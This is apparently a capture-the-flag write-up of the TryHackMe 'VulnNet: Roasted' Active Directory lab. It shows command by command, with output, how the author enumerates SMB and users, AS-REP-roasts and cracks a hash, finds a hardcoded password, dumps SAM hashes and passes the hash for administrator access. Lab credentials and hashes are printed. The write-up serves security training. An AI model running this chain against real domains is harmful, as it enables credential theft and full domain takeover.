---
layout: default
title : muzec - VulnNet: Roasted Writeup
---

![image](https://user-images.githubusercontent.com/69868171/125277248-19ae5b80-e309-11eb-98f1-62a54520134f.png)

We always start with an nmap scan.....

```nmap -sC -sV -Pn -oA nmap 10.10.108.117 -T5```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ nmap -sC -sV -Pn -oA nmap 10.10.108.117 -T5
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 08:58 WAT
Nmap scan report for 10.10.108.117
Host is up (0.24s latency).
Not shown: 990 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h00m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-12T10:59:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.97 seconds
```

Seems we are dealing with Active Directory cool let confirm if we have port `5985` open for Winrm.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ nmap -sC -sV -Pn -p 5985 10.10.108.117
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 09:07 WAT
Nmap scan report for 10.10.108.117
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

I love checking the Winrm port it can be useful in future now let start with our enumeration on SMB.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ smbclient -L //10.10.108.117/ -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```

Some shares we allow have access to `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous` but nah nothing is useful in the shares now let look at impacket `lookupsid.py` to enumerate for users.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ lookupsid.py anonymous@10.10.108.117
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.108.117
[*] StringBinding ncacn_np:10.10.108.117[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

We only need the SidTypeUser.

```
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

If Kerberos pre-authentication is disabled on any of the above accounts, we can use the GetNPUsers impacket script to send a request for authentication KDC which will then return a TGT that is encrypted with the user’s password.

NOTE:- add `vulnnet-rst.local` with IP to `/etc/hosts` 

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ GetNPUsers.py -dc-ip vulnnet-rst.local vulnnet-rst.local/t-skid -no-pass
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for t-skid
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:7bfbc6a7a10f6496e1420c5b78356206$083b8715ab6ee61199460164f2b0658cd2461f787279e216b91b4372daee175c9d18960178f8f7594d1cdb991e4b03e18c1ba422620178be04499cceb6e77680aca65eafb479f018b3b90ac3bd5ad94918e25c0e26227624d69000e33486c92735eb2a42bce47b816feaa6e0b8bfad800829658f3116ae9324549976fe1d4a6df49b1bbeb72d8016582516faffa78801e052eb2b8ea04c6ad807d7fe8c3d626a0ea6a1e70e52cb4c98f2683adba9e3bf8214f6a5b5c183484f3f4f3dfc96920402d4c05a56772e0174e1b33d9523d34e768f51fd7b958b80934de0484a14b2d25490c7eac00d19a963aba0a32fc6d566c00a6085deea
```

Kerberos pre-authentication was disabled for user `t-skid` and we have the hash let crack it using `John The Ripper` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:04 DONE (2021-07-12 09:38) 0.2087g/s 663569p/s 663569c/s 663569C/s tjalling..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we have credentials let try it on SMB.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ smbclient -L //10.10.108.117/ -U t-skid
Enter WORKGROUP\t-skid's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ smbclient  //10.10.108.117/NETLOGON -U t-skid
Enter WORKGROUP\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

                8771839 blocks of size 4096. 4553504 blocks available
smb: \> 
```

Downloaded to my attacking machine let `strings` the vbs file.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ strings ResetPassword.vbs                                       
Option Explicit                                                                    
Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain             
Dim strUserDN, objUser, strPassword, strUserNTName
' Constants for the NameTranslate object.     
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1                                                       
If (Wscript.Arguments.Count <> 0) Then                                             
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If                         
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
' Determine DNS domain name from RootDSE object.                  
Set objRootDSE = GetObject("LDAP://RootDSE")                          
strDNSDomain = objRootDSE.Get("defaultNamingContext")           
' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)
' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.      
On Error Resume Next                                                               
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"     
    Wscript.Echo "Program aborted"                                                 
    Wscript.Quit
End If                                                                             
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
```
Another credentials cool let confirm which permission we have with `crackmapexec` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]
└─$ crackmapexec smb 10.10.108.117 -u a-whitehat -p bNdKVkjv3RR9ht     
SMB         10.10.108.117   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.108.117   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

We got `Pwn3d` now that is interesting back to `Impacket` to use ` secretsdump.py` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]                                                                                                       
└─$ secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.108.117                                                                                           
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation            
                                                                                                                                                                       
[*] Service RemoteRegistry is in stopped state                                                                                                                         
[*] Starting service RemoteRegistry                                                                                                                                    
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a         
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::         
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                     
[*] Dumping cached domain logon information (domain/username:hash)                                                                                                     
[*] Dumping LSA Secrets                                           
```

So i dump all users hashes now we can use `evil-winrm` with the pass the hash attack to gain administrator access.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/vulnetroasted]                                                                                                       
└─$ evil-winrm -i 10.10.108.117 -u administrator -H c2597747aa5e43022a3a3049a3c3b09d                                                                                   
                                         
Evil-WinRM shell v2.4 

Info: Establishing connection to remote endpoint                                                                                                                       
                                                                                                                                                                       
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all                                                                                                          
                                                                                                                                                                       
USER INFORMATION                                                                                                                                                       
----------------                                                                                                                                                       
                                                                                                                                                                       
User Name                 SID                                                                                                                                          
========================= ============================================                                                                                                 
vulnnet-rst\administrator S-1-5-21-1589833671-435344116-4136949213-500                                                                                                 
                                                                                                                                                                       
                                                                                                                                                                       
GROUP INFORMATION                                                                                                                                                      
-----------------                                                                                                                                                      
                                                                                                                                                                       
Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ======================================================
=========                                                                                                                                                              
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Gr
oup owner                                                                                                                                                              
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Group Policy Creator Owners            Group            S-1-5-21-1589833671-435344116-4136949213-520 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Enterprise Admins                      Group            S-1-5-21-1589833671-435344116-4136949213-519 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Schema Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-518 Mandatory group, Enabled by default, Enabled group
```

We are in and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
